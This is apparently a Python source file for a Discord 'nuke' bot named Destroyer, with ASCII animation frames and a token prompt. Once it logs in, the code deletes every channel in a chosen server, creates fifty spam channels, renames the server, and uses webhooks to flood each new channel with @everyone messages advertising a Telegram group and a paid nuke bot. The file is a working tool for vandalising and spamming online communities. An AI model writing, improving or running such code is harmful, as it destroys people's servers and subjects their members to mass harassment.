#===ANIMATION===

animation_frames = [
" \n"+
"          o _ @\n"+
"       []  {_}  *\n"+
"           /*\\\n"+
"      <>  /_*_\\  o\n"+
"     _   {('o')}\n"+
"    (_){{([^*^])}}0\n"+
"          [ # ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

" \n"+
"          []_ o\n"+
"       <>  {_}  @\n"+
"      _    /*\\ \n"+
"     (_)  /_*_\\  *\n"+
"         {('o')} \n"+
"      #{{([^*^])}}o\n"+
"          [ 0 ]\n"+
"         /  Y  \\ \n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

" \n"+
"        _ <>_ []\n"+
"       (_) {_}  o\n"+
"           /*\\  \n"+
"       #  /_*_\\  @\n"+
"         {('o')}  \n"+
"      0{{([^*^])}}*\n"+
"          [ o ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

"          _\n"+
"         (_)_ <>\n"+
"        #  {_}  []\n"+
"           /*\\  \n"+
"       0  /_*_\\  o\n"+
"         {('o')}  \n"+
"      o{{([^*^])}}@\n"+
"          [ * ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

"              _\n"+
"          # _(_)\n"+
"        0  {_}  <>\n"+
"           /*\\  \n"+
"       o  /_*_\\  []\n"+
"         {('o')}  \n"+
"      *{{([^*^])}}o\n"+
"          [ @ ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

" \n"+
"          0 _ # _\n"+
"        o  {_} (_)\n"+
"           /*\\  \n"+
"       *  /_*_\\  <>\n"+
"         {('o')}  \n"+
"      @{{([^*^])}}[]\n"+
"          [ o ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

" \n"+
"          o _ 0 \n"+
"        *  {_}  #\n"+
"           /*\\   _\n"+
"       @  /_*_\\ (_)\n"+
"         {('o')}  \n"+
"      o{{([^*^])}}<>\n"+
"          [[] ]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",


" \n"+
"          * _ o\n"+
"        @  {_}  0\n"+
"           /*\\\n"+
"       o  /_*_\\  #\n"+
"         {('o')}   _\n"+
"     []{{([^*^])}}(_)\n"+
"          [ <>]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)",

" \n"+
"          @ _ *\n"+
"        o  {_}  o\n"+
"           /*\\\n"+
"      []  /_*_\\  0\n"+
"         {('o')}   \n"+
"     <>{{([^_^])}}#\n"+
"          [(_)]\n"+
"         /  Y  \\\n"+
"        _\\__|__/_\n"+
" jgs   (___/ \\___)"

]

from colorama import Fore, Back, Style, init; import os
import requests, sys, time
#===importnado discord.py===
import discord; from discord.ext import commands; import asyncio; import aiohttp, random
init()
menu = """
▓█████▄ ▓█████   ██████ ▄▄▄█████▓ ██▀███   ▒█████ ▓██   ██▓▓█████  ██▀███  
▒██▀ ██▌▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒██  ██▒▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒███   ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒ ▒██ ██░▒███   ▓██ ░▄█ ▒
░▓█▄   ▌▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░ ░ ▐██▓░▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░▒████▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░ ░ ██▒▓░░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░   ██▒▒▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ▓██ ░▒░  ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░    ░   ░  ░  ░    ░        ░░   ░ ░ ░ ░ ▒  ▒ ▒ ░░     ░     ░░   ░ 
   ░       ░  ░      ░              ░         ░ ░  ░ ░        ░  ░   ░     
 ░                                                 ░ ░                    
"""
linea = """(<3)--------------------------------------------------------(<3)"""
#===CONEXION A DISCORD===
destroyer = commands.Bot(command_prefix="...........", intents=discord.Intents.all())
#=======COLORES=======
azul, rojo, verde, amarillo, magenta, cyan, blanco, negro, fondo_azul, fondo_rojo, fondo_verde, fondo_amarillo, fondo_magenta, fondo_cyan, fondo_blanco, fondo_negro, normal, negrita, dim, subrayado = Fore.BLUE, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.BLACK, Back.BLUE, Back.RED, Back.GREEN, Back.YELLOW, Back.MAGENTA, Back.CYAN, Back.WHITE, Back.BLACK, Style.RESET_ALL, Style.BRIGHT, Style.DIM, Style.NORMAL
#=======CODIGO=======
def check(token):
    headers = {'Authorization': f'Bot {token}'}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if response.status_code == 200: return True 
    else: return False


def get_token():
    print(rojo + menu + normal)
    print(rojo + linea + normal)
    token = input(f"{rojo}Enter {blanco}the {rojo}bot {amarillo}token{fondo_rojo}: {normal}")
    return token

@destroyer.event
async def on_guild_channel_create(channel):
    embed = {"description": "ㅤㅤㅤㅤㅤㅤThis shit got nuked by [DeadDestroyers](https://t.me/deaddestroyers)\nㅤ\n\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[`#DD`](https://t.me/deaddestroyers)\nㅤㅤㅤㅤㅤㅤㅤㅤㅤ[Telegram](https://t.me/deaddestroyers) - [Nuke Bot](https://youngaos.mysellix.io/product/6517a4bdc49f7)", "color": 2764080, "footer": {"text": "ㅤㅤ"}, "image": {"url": "https://cdn.discordapp.com/attachments/1173097909114372107/1173436804788133888/dd.png"}}
    webhook = await channel.create_webhook(name="Destroyer")
    async with aiohttp.ClientSession() as session:
        for i in range(30):
            try:
                headers = {'Content-Type': 'application/json'}
                webhook_url = webhook.url
                msg = [f"> ||@everyone|| https://t.me/deaddestroyers <-", "> ||@everyone|| Imagine get nuked", "> ||@everyone|| https://t.me/deaddestroyers"]
                data_embed = {"content": random.choice(msg),"embeds": [embed]}
                tasks = [session.post(webhook_url, headers=headers, json=data_embed)]
                await asyncio.sleep(0.1)  
                await asyncio.gather(*tasks)
            except Exception as e: pass

@destroyer.event
async def on_ready():
    try: os.system("cls") 
    except: os.system("clear")
    print(rojo + menu + normal)
    print(rojo + linea + normal)
    print(f"""
                    D E S T R O Y E R
                {normal}NAME: {rojo}{destroyer.user.name}
                {normal}ID: {rojo}{destroyer.user.id}
                {normal}SVS: {rojo}{len(destroyer.guilds)}{normal}
""")
    server = input(f"{rojo} Server to nuke ID: {normal}")
    try: guild = discord.utils.get(destroyer.guilds, id=int(server))
    except: print(f"{rojo} The bot is not in that server{normal}")
    print(f"""
                    O P T I O N S
            1: WIZZ                 BY: AOS
""")
    select = input(f"{rojo}>{normal}")
    if select == "1": 
        frame_duration = 0.1
        total_duration = 3
        num_repetitions = int(total_duration / (len(animation_frames) * frame_duration)) + 1
        for i in range(num_repetitions):
            for frame in animation_frames:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(frame)
                time.sleep(frame_duration)
        print(rojo+menu+normal)
        os.system('cls' if os.name == 'nt' else 'clear')
        try: await guild.edit(community=None)
        except: pass
        try: await asyncio.gather(*[channel.delete() for channel in guild.channels])
        except: pass
        await asyncio.gather(*[guild.create_text_channel("wizzed-by-aos") for _ in range(50)])
        await guild.edit(name="WIZZED", description="DeadDestroyers on TOP")
    else: print("Invalid OPTION"); time.sleep(1); sys.exit()
    

def main():
    token = get_token()
    test = check(token)
    if test: print(verde + "Valid token, login..." + normal); destroyer.run(token)
    else: print(rojo + "Invalid token, closing in 5s..." + normal); time.sleep(5); sys.exit()

main()